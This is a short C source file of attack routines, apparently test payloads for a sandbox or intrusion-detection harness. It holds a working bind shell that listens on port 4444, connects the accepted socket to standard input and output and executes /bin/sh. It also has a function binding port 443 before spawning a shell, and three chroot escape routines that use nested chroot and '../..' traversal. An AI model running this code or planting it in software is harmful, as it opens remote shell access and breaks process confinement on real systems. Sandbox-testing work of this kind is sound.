
#include <unistd.h> 
#include <stdio.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h> 
#include <sys/stat.h>
#include <fcntl.h>

// bind socket 
int vulnerability1() 
{
    int s;
    int ret;
    struct sockaddr_in addr;
    printf("!!! triggering vulnerability1 !!!\n");

    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);

    s = socket(PF_INET, SOCK_STREAM, 0); 
    ret = bind(s, (struct sockaddr*)&addr, sizeof(addr));  
    printf("VULN: bind error is %d\n", ret);
    listen(s, 100);

    execve("/bin/sh", NULL, NULL);
    return 0;
}

int attack_bind_shell()
{
    pid_t child = 0;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = INADDR_ANY;

    printf("attack!!! bind shell to 4444\n");
    if(fork() == 0)
    {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
        listen(sockfd, 0);

        int connfd = accept(sockfd, NULL, NULL);
        for (int i = 0; i < 3; i++)
        {
            dup2(connfd, i);
        }

        execve("/bin/sh", NULL, NULL);
    }
    return 0;
}

int spawn_sh()
{
    execve("/bin/sh", NULL, NULL);
}

int attack_chroot_escape()
{
    printf("chroot escape!\n");
    int fd = open(".", O_DIRECTORY);
    mkdir("fnord", 777);
    chroot("fnord");
    chdir("../../../../../../..");
    chroot(".");
}

int attack_chroot_escape2()
{
    printf("chroot escape2!\n");
    chdir("../../../../../../..");
    chroot(".");
}

int attack_chroot_escape3()
{
    printf("chroot escape2!\n");
    mkdir(".42", 0755);
    chroot(".42");
    //fchdir(3); // there is a log file open at fd 3
    chdir("..");
    chroot(".");
}
